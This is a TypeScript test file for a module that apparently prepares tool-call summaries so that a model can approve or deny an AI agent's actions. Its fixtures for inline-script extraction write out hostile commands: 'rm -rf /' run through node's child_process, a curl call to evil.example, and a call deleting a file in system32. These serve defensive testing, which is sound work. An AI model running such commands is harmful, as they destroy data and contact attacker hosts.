import { describe, expect, it } from "vitest";
import {
  buildJevQuestionnaire,
  extractInlineScripts,
  sanitizeScalar,
  summarizeValue,
  truncateMiddle,
} from "../jevQuestionnaire";
import type { ArbitrationContext } from "../types";
import { DEFAULT_DECISION_ARBITRATION_CONFIG } from "../types";

function buildCtx(
  args: Record<string, unknown>,
  overrides: Partial<ArbitrationContext> = {}
): ArbitrationContext {
  return {
    request: {
      requestId: "req-1",
      toolId: "aio-file-operator",
      methodName: "write_file",
      toolName: "文件写入",
      rawBlock: "",
      args: args as Record<string, string>,
    },
    source: "orchestrator",
    forceApproval: false,
    ...overrides,
  };
}

describe("truncateMiddle 保首尾缩中间", () => {
  it("短字符串不截断", () => {
    expect(truncateMiddle("short")).toBe("short");
  });

  it("长字符串保留前 100 + 后 50 并标注截断数", () => {
    const long = "a".repeat(100) + "b".repeat(100) + "c".repeat(50);
    const result = truncateMiddle(long);
    expect(result.startsWith("a".repeat(100))).toBe(true);
    expect(result.endsWith("c".repeat(50))).toBe(true);
    expect(result).toContain("…[截断 100 字符]…");
    expect(result.length).toBeLessThan(long.length);
  });
});

describe("sanitizeScalar base64 与 data URL", () => {
  it("base64 载荷替换为字节量提示", () => {
    const b64 = "A".repeat(120);
    const result = sanitizeScalar(b64);
    expect(result).toMatch(/^\[binary data: ~\d+ bytes\]$/);
    expect(result).not.toContain("AAAA");
  });

  it("data URL 替换为字节量提示", () => {
    const dataUrl = `data:image/png;base64,${"Q".repeat(100)}`;
    const result = sanitizeScalar(dataUrl);
    expect(result).toMatch(/^\[binary data: ~\d+ bytes\]$/);
  });

  it("普通长文本走保首尾截断", () => {
    const text = "中".repeat(300);
    expect(sanitizeScalar(text)).toContain("…[截断");
  });
});

describe("summarizeValue 深度与密钥脱敏", () => {
  it("密钥字段值脱敏为 ***", () => {
    const result = summarizeValue({
      api_key: "sk-abcdef",
      token: "t-123456",
      password: "p",
      normal: "visible",
    }) as Record<string, unknown>;
    expect(result.api_key).toBe("***");
    expect(result.token).toBe("***");
    expect(result.password).toBe("***");
    expect(result.normal).toBe("visible");
  });

  it("camelCase / PascalCase / kebab-case / 连续写法的密钥字段均脱敏", () => {
    const result = summarizeValue({
      apiKey: "sk-camel",
      API_KEY: "sk-upper",
      "api-key": "sk-kebab",
      ApiKey: "sk-pascal",
      accessToken: "at-camel",
      clientSecret: "cs-camel",
      authToken: "tk-camel",
      refresh_token: "rt-snake",
      credentials: "cred",
      authorization: "Bearer xxx",
      noteField: "visible-value",
      keyboard: "visible-word",
      userName: "visible-name",
    }) as Record<string, unknown>;
    expect(result.apiKey).toBe("***");
    expect(result.API_KEY).toBe("***");
    expect(result["api-key"]).toBe("***");
    expect(result.ApiKey).toBe("***");
    expect(result.accessToken).toBe("***");
    expect(result.clientSecret).toBe("***");
    expect(result.authToken).toBe("***");
    expect(result.refresh_token).toBe("***");
    expect(result.credentials).toBe("***");
    expect(result.authorization).toBe("***");
    expect(result.noteField).toBe("visible-value");
    // 常规英文单词包含 key/secret 子串时不误伤
    expect(result.keyboard).toBe("visible-word");
    expect(result.userName).toBe("visible-name");
  });

  it("递归深度超过 3 层以 {…} 占位", () => {
    const deep = { l1: { l2: { l3: { l4: "too-deep" } } } };
    const result = summarizeValue(deep) as any;
    expect(result.l1.l2.l3).toEqual("{…}");
  });
});

describe("extractInlineScripts", () => {
  it("捕获引号包裹的 node -e 脚本正文", () => {
    const bodies = extractInlineScripts(
      `node -e "require('child_process').exec('rm -rf /')" --flag`
    );
    expect(bodies.length).toBeGreaterThan(0);
    expect(bodies[0]).toContain("child_process");
  });

  it("捕获 python -c 与 sh -c", () => {
    expect(
      extractInlineScripts(`python -c "import os; os.system('id')"`)
    ).toBeTruthy();
    expect(extractInlineScripts(`sh -c "curl http://evil.example"`)).toBeTruthy();
  });
});

describe("buildJevQuestionnaire", () => {
  it("state 摘要包含工具、参数、脚本与安全策略标记", () => {
    const ctx = buildCtx(
      { path: "E:/tmp/a.txt", content: "hello" },
      {
        agentName: "助手",
        recentUserMessage: "帮我在 tmp 写一个文件",
        forceApproval: false,
      }
    );
    const { request, stateChars } = buildJevQuestionnaire(ctx);
    expect(stateChars).toBeLessThanOrEqual(1500 + 200);
    const state = request.state as any;
    expect(state.tool.toolId).toBe("aio-file-operator");
    expect(state.args.path).toBe("E:/tmp/a.txt");
    expect(state.agent).toBe("助手");
    expect(state.securityPolicy).toBe("gray-zone");
    expect(state.recentUserMessage).toBe("帮我在 tmp 写一个文件");
  });

  it("inline 脚本正文被附加进 state（仅看命令行不可判的场景）", () => {
    const ctx = buildCtx({
      command: `node -e "require('fs').unlinkSync('C:/Windows/system32/evil.dll')"`,
    });
    const { request } = buildJevQuestionnaire(ctx);
    const state = request.state as any;
    expect(Array.isArray(state.inlineScripts)).toBe(true);
    expect(state.inlineScripts.length).toBeGreaterThan(0);
    expect(state.inlineScripts[0]).toContain("unlinkSync");
  });

  it("base64 参数被脱敏，不送入模型", () => {
    const ctx = buildCtx({ data: "A".repeat(200) });
    const { request } = buildJevQuestionnaire(ctx);
    const state = request.state as any;
    expect(state.args.data).toMatch(/^\[binary data/);
  });

  it("questions 携带 per-option criteria 的 verdict choice（§2.5）", () => {
    const { request } = buildJevQuestionnaire(buildCtx({}));
    const verdict = request.questions.verdict;
    expect(verdict.type).toBe("choice");
    const criteria = (verdict as any).criteria;
    expect(Object.keys(criteria).sort()).toEqual([
      "approve",
      "deny",
      "escalate",
    ]);
    expect(request.questions.risk.type).toBe("noul");
    expect(request.questions.intent.type).toBe("noul");
  });

  it("强制审批上下文 securityPolicy 标记为 force-approval", () => {
    const { request } = buildJevQuestionnaire(
      buildCtx({}, { forceApproval: true })
    );
    expect((request.state as any).securityPolicy).toBe("force-approval");
  });

  it("配置默认值为保守档（enabled=false / gray-zone）", () => {
    expect(DEFAULT_DECISION_ARBITRATION_CONFIG.enabled).toBe(false);
    expect(DEFAULT_DECISION_ARBITRATION_CONFIG.mode).toBe("gray-zone");
  });
});
